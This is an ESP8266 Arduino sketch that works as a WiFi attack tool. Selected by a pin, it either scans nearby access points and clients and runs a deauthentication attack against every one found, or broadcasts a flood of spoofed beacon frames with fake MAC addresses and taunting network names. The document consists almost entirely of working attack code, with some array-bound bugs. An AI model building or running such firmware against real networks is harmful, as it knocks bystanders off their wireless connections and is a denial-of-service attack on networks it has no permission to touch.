#include <Arduino.h>

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>

extern "C" {
#include "user_interface.h"
}

ESP8266WebServer server(80);

#include <EEPROM.h>
#include "data.h"
#include "NameList.h"
#include "APScan.h"
#include "ClientScan.h"
#include "Attack.h"
#include "Settings.h"
#include "SSIDList.h"




int c = 16;
int chr = 0;
int nr = 0;
char *macs[] = { "37 CE 77 EF E1 00"  , "26 CE 77 EF E1 01"  , "26 CE 54 EF E1 02"  , "26 44 77 EF E1 03"  , "26 CE 77 EF E1 04"  , "26 73 77 EF E1 05"  , "26 CE 77 33 E1 06"  , "26 37 77 EF E1 07"  , "26 CE 77 EF E1 08"  , "26 85 77 EF E1 09"  , "33 CE 77 EF E1 0A"  , "26 CE 77 EF E1 0B"  , "26 CE 77 EF E1 0C"  , "26 CE 77 EF E1 0D"  , "26 CE 77 EF E1 0E"  , "26 CE 77 EF E1 0F"  , "26 CE 77 EF E1 10"  , "26 CE 77 EF E1 11"  , "26 CE 77 EF E1 12"  , "26 CE 77 EF E1 13"  , "26 CE 77 EF E1 14"  , "26 CE 77 EF E1 15"  , "26 CE 77 56 E1 16"  , "26 CE 43 EF E1 17"  , "26 CE 77 EF E1 18"  , "97 CE 77 EF E1 19"  , "26 CE 77 EF 2E 1A"  , "26 CE 77 E8 E1 1B"  , "26 C6 77 EF E1 1C"  , "26 C0 77 EF E1 1D"  , "26 6E 77 EF E1 1E"  , "26 CE 77 EF 91 1F"  , "26 CE 77 EF E1 20"  , "26 CE 77 EF E1 21"  , "26 CE 77 EF E1 22"  , "26 CE 77 EF E1 23"  , "26 CE 77 EF E1 24"  , "26 CE 77 EF E1 25"  , "26 CE 77 EF E1 26"  , "26 CE 77 EF E1 27"  , "26 CE 77 EF E1 28"  , "26 CE 77 EF E1 29"  , "26 CE 77 EF E1 2A"  , "26 CE 77 EF E1 2B"  , "26 CE 77 EF E1 2C"  , "26 CE 77 EF E1 2D"  , "26 CE 77 EF E1 2E"  , "26 CE 77 EF E1 2F"  , "26 CE 77 EF E1 30"  , "26 CE 77 EF E1 31"  , "26 CE 77 EF E1 32"  , "26 CE 77 EF E1 33"  , "26 CE 77 EF E1 34"  , "26 CE 77 EF E1 35"  , "26 CE 77 EF E1 36"  , "26 CE 77 EF E1 37"  , "26 CE 77 EF E1 38"  , "26 CE 77 EF E1 39"  , "26 CE 77 EF E1 3A"  , "26 CE 77 EF E1 3B"  , "26 CE 77 EF E1 3C"  , "26 CE 77 EF E1 3D"  , "26 CE 77 EF E1 3E"  , "26 CE 77 EF E1 3F"  , "26 CE 77 EF E1 40"  , "26 CE 77 EF E1 41"  , "26 CE 77 EF E1 42"  , "26 CE 77 EF E1 43"  , "26 CE 77 EF E1 44"  , "26 CE 77 EF E1 45"  , "26 CE 77 EF E1 46"  , "26 C4 77 EF E1 47"  , "26 C2 77 2F E1 48"  , "26 CE 77 EF E1 49"  , "26 CE 77 E4 E1 4A"  , "26 CE 77 EF E1 4B"  , "46 CE 77 EF E1 4C"  , "24 CE 77 EF E1 4D"  , "26 CE 77 EF E1 4E"  , "26 CE 79 EF E1 4F"  , "26 C9 77 EF E1 50"  , "26 C9 77 E9 E1 51"  , "26 CE 77 EF E1 52"  , "26 CE 77 EF E1 53"  , "20 CE 77 EF E1 54"  , "EF CE 77 EF E1 55"  , "26 CE 77 EF FF 56"  , "26 CE FF EF E1 57"  , "26 CE 77 EF E1 58"  , "26 CE 77 EF E1 59"  , "26 CE 77 EF E1 5A"  , "26 CE 77 EF E1 5B"  , "26 CE 77 EF E1 5C"  , "26 CE 77 EF E1 5D"  , "26 CE 77 EF E1 5E"  , "26 CE 77 EF E1 5F"  , "26 CE 77 EF E1 60"  , "26 CE 77 EF E1 61"  , "26 CE 77 EF E1 62"  , "26 CE 77 EF E1 63"  , "26 CE 77 EF E1 64"  , "26 FF 77 EF E1 65"  , "BB CE 77 EF E1 66"  , "26 CE BB EF E1 67"  , "26 BB 77 EF E1 68"  , "26 CE 77 EF E1 69"  , "26 CE 77 EF E1 6A"  , "26 CE 77 EF E1 6B"  , "26 CE 77 EF E1 6C"  , "26 CE 77 EF E1 6D"  , "26 CE 77 EF E1 6E"  , "26 CE 77 EF E1 6F"  , "26 AA 77 EF E1 70"  , "26 CE AA EF E1 71"  , "26 CE 77 AA E1 72"  , "26 AC 77 EF E1 73"  , "26 CE AC EF E1 74"  , "26 CE 77 EF CA 75"  , "26 CE AC EF E1 76"  , "26 CE 77 EF E1 77"  , "26 CE 77 EF E1 78"  , "26 CE 77 EF E1 79"  , "26 CE 77 EF E1 7A"  , "26 CE 77 EF E1 7B"  , "26 CE 77 EF E1 7C"  , "26 CE 77 AB E1 7D"  , "26 CE 77 E2 AB 7E"  , "26 CE 77 EF E1 7F"  , "26 AB 77 E2 E1 80"  , "26 CE 2A EF E1 81"  , "22 CE 77 EF E1 82"  , "BA CE 72 EF E1 83"  , "26 22 77 EF E1 84"  , "26 CE 77 2F E1 85"  , "26 CE 77 EF 21 86"  , "26 CE 77 EF E1 87"  , "26 CE 77 EF E1 88"  , "26 CE 77 EF E1 89"  , "26 CE 77 EF E1 8A"  , "26 CE 77 EF E1 8B"  , "26 CE 77 EF E1 8C"  , "26 CE 77 EF E1 8D"  , "26 CE 77 EF E1 8E"  , "26 CE 77 EF 67 8F"  , "26 CE 77 EF E1 90"  , "26 CE 77 EF E1 91"  , "26 CE 77 EF E1 92"  , "26 CE 77 EF E1 93"  , "26 CE 77 EF E1 94"  , "26 CE 77 EF E1 95" };

int nrMacs = 256;

String text[150] = {"We_own_you", "knowledge_is_power", "Glory_TO_GAMILLA!", "cant_escape" , "Hack","POWNED","PLAYING","Fucking_with_you", "Screwyou", "I have power","I know about you","Too many net", "Same_forme", "please_STOP", "justanothernet","onemore", "GAmilla", "Glory_to_R", "SUper", "AP", "jocker", "RoyBatty", "Batman", "CoraKaiSei", "Yamazaki","Quinlan","Tommy ","Voldemort","Hudson","Kurtz","Thorwald","Khan","Rebecca ","Landa","Ratched","Stone","Udo","The Evil Queen","Chigurh","Forrest","John Doe","Max Cady","Angel Eyes","Little Bill Daggett","Sergeant Hartman","Gollum","Don Logan","Bates","Alien","Terminator","Goldfinger","Freddy Kruege","Noah Cross","Gordon","General Zod", "Android AP", "ssid","xfinitywifi","linksys","<no ssid>","BTWiFi-with-FON","NETGEAR","Ziggo","dlink","BTWifi-X","default","FreeWifi","hpsetup","UPC Wi-Free","optimumwifi","FreeWifi_secure","AndroidAP","eduroam","BTWIFI","TELENETHOMESPOT","cablewifi","KPN Fon","SFR WiFi Mobile","asus","belkin54g","TelenetWiFree","wireless","Home","orange","SFR WiFi FON","Guest","Fritz!Box Fon WLAN 7390","TWCWiFi","BTOpenzone","UPC WifiSpots","setup","BTFON","WLAN","attwifi","no_ssid","Telekom_FON","FRITZ!Box 7490","KD WLAN Hotspot+","portthru","SFR WiFi Public","FRITZ!Box Fon WLAN 7170","FRITZ!Box 7362 SL","FRITZ!Box Fon WLAN 7270","0001softbank","FRITZ!Box 7312","internet","FRITZ!Box Fon WLAN 7112","FON_ZON_FREE_INTERNET","iPhone","SWS1day","Bouygues Telecom Wi-Fi","PROXIMUS_AUTO_FON","FRITZ!Box 6360 Cable","ZyXEL","FRITZ!Box Fon WLAN 7360","PROXIMUS_FON","FON_BELGACOM","Tp-link","Vodafone Hotspot","BTOpenzone-H","TWCWiFi-Passpoint","Free Public WiFi","hhonors","_AUTO_ONOWiFi","FON_FREE_INTERNET","ACTIONTEC","BTOpenzone-B","VOIP","au_Wi-Fi","freephonie","SMC","(null)","FON_NETIA_FREE_INTERNET","FRITZ!Box Fon WLAN 7113","Wi2premium","BELTELECOM WIFI","wifi","vodafone-WiFi","U+zone","EAGLE","Wi2premium_club","MyPlace","FRITZ!Box 7330 SL","iptime","Motorola","airportthru","Sitecom","FRITZ!Box 6490 Cable","D-LINK","orange12"};
byte channel;

// Beacon Packet buffer
uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
                        /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                        /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                        /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                        /*22*/  0xc0, 0x6c,
                        /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                        /*32*/  0x64, 0x00,
                        /*34*/  0x01, 0x04,
                        /* SSID */
                        /*36*/  0x00, 0x0e, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                        0x01, 0x08, 0x82, 0x84,
                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                        /*65*/  0x04
                      };


/* ========== DEBUG ========== */
const bool debug = true;
/* ========== DEBUG ========== */

NameList nameList;

APScan apScan;
ClientScan clientScan;
Attack attack;
Settings settings;
SSIDList ssidList;

int val;
int BuffSize=255;

void sniffer(uint8_t *buf, uint16_t len) {
  clientScan.packetSniffer(buf, len);
}

void startWifi() {
  Serial.println("starting WiFi AP");
  WiFi.mode(WIFI_STA);
  wifi_set_promiscuous_rx_cb(sniffer);
  WiFi.softAP((const char*)settings.ssid.c_str(), (const char*)settings.password.c_str(), settings.apChannel, settings.ssidHidden); //for an open network without a password change to:  WiFi.softAP(ssid);
  Serial.println("SSID: " + settings.ssid);
  Serial.println("Password: " + settings.password);
  if (settings.password.length() < 8) Serial.println("WARNING: password must have at least 8 characters!");
  if (settings.ssid.length() < 1 || settings.ssid.length() > 32) Serial.println("WARNING: SSID length must be between 1 and 32 characters!");
}

//==========AP-Scan==========
void startAPScan() {
  if (apScan.start()) {
    attack.stopAll();
  }
}


//==========Client-Scan==========
void startClientScan() {
  if(apScan.getFirstTarget() > -1 ){ // ( apScan.getFirstTarget() > -1 && !clientScan.sniffing) {
    //server.send(200, "text/json", "true");
    clientScan.start(5);
    attack.stopAll();
  }
}

//==========Attack==========

void startAttack() {
  if (true){ 
    int _attackNum = 0;
    if (apScan.getFirstTarget() > -1 || _attackNum == 2 || _attackNum == 3) {
      attack.start(0);
      //attack.start(1);

    }
  }
}


void setup() {

  Serial.begin(115200);
  delay(2000);

  pinMode(2, OUTPUT);
  delay(50);
  digitalWrite(2, HIGH);

  pinMode(16, INPUT);

  val= digitalRead(16);
  
  EEPROM.begin(4096);
  
  settings.load();
  if (debug) settings.info();
  nameList.load();
  ssidList.load();

  Serial.println("");
  Serial.println("starting...");

  if(val==0){
    Serial.println("GPIO15=0 Launching Deauth Attack");
    startWifi();
    attack.stopAll();
    attack.generate();
    startAttack();
  }
  else{

    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(1);
    Serial.println("GPIO=1 Launching BSSID Clone Attack");
    
    }
}





unsigned int hexToDec(String hexString) {
  unsigned int decValue = 0;
  int nextInt;
  for (int i = 0; i < hexString.length(); i++) {
    nextInt = int(hexString.charAt(i));
    if (nextInt >= 48 && nextInt <= 57) nextInt = map(nextInt, 48, 57, 0, 9);
    if (nextInt >= 65 && nextInt <= 70) nextInt = map(nextInt, 65, 70, 10, 15);
    if (nextInt >= 97 && nextInt <= 102) nextInt = map(nextInt, 97, 102, 10, 15);
    nextInt = constrain(nextInt, 0, 15);
    decValue = (decValue * 16) + nextInt;
  }
  return decValue;
}

void spoofMac(String str) {
    packet[10] = packet[16] = hexToDec(str.substring(0, 2));
    packet[11] = packet[17] = hexToDec(str.substring(3, 5));
    packet[12] = packet[18] = hexToDec(str.substring(6, 8));
    packet[13] = packet[19] = hexToDec(str.substring(9, 11));
    packet[14] = packet[20] = hexToDec(str.substring(12, 14));
    packet[15] = packet[21] = hexToDec(str.substring(15, 17));
}

void printPacket(){
  for(int i; i< sizeof(packet); i++)
        Serial.print(packet[i]);
    
  Serial.println();
  }

void loop() {
 switch (val){
    
      case 1:{
        Serial.println("1 loop ended.. restarting");
            for (int j=0; j<BuffSize; j++){ 
                      channel = random(1, 12);
                      wifi_set_channel(channel);
                    //Serial.println(macs[j] + (String)j);
                      spoofMac(macs[j]);
                    
                    for (int i = 41; i <= 52; i++) {
                      packet[i] = ' ';
                    }
                  
                    int pcount = 38;
                    //int ssid=random(0,255);
                    String ssidname= text[j];
                    for(int i=0; i < ssidname.length(); i++){
                        packet[pcount] = ssidname[i];
                        pcount++;
                    }
     
                   //printPacket();
                    wifi_send_pkt_freedom(packet, 57, 0);
                    delay(10);
                    wifi_send_pkt_freedom(packet, 57, 0);
                    //delay(10);
                    //wifi_send_pkt_freedom(packet, 57, 0);
                    //delay(10);
                   // wifi_send_pkt_freedom(packet, 57, 0);
                   

            }
                    

          break;
      }
      default:
          if (apScan.start()){
            Serial.println("Scan/attack Done.. num AP found: " + (String)apScan.results);
        
                      //Select the AP
           for (int i=0; i<apScan.results; i++){
              apScan.select(i);
              Serial.print("Selecting: AP Name " + apScan.getAPName(i));
              delay(300);
              }
              
    
              //start client Scan
              startClientScan();
              if (clientScan.sniffing) {
                while (!clientScan.stop()){  delay(100); }
                startWifi();
                }
              Serial.print("Number of client found: " +(String) clientScan.results );
              
              //Select all the client found
              for (int j=0; j<clientScan.results; j++){
                clientScan.select(j);
                Serial.print("Selecting: Client Name " +clientScan.getClientName(j));
              }
    
              //selecting the attack
               if(!attack.isRunning[0]){
                  startAttack();
                }
                
              //Attack
              for(int j=0; j<100; j++){
              attack.run();
                 delay(500);
              }
    
              
              //Deselect the AP
              for (int i=0; i<apScan.results; i++){
              apScan.select(i);
              }
                }
            delay(100);
        }

}

